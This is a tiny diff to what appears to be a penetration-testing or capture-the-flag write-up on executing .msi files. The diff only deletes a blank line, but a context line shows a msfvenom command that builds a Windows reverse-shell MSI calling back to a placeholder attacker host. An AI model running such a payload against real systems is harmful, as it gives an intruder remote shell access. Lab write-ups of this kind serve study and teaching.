@@ -35,7 +35,6 @@ found something interesting... this means that I can execute any kind of .msi fi
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4442 -f msi -o reverse_4442.msi
 ```
 
-
 ### References
 
 - _(none)_
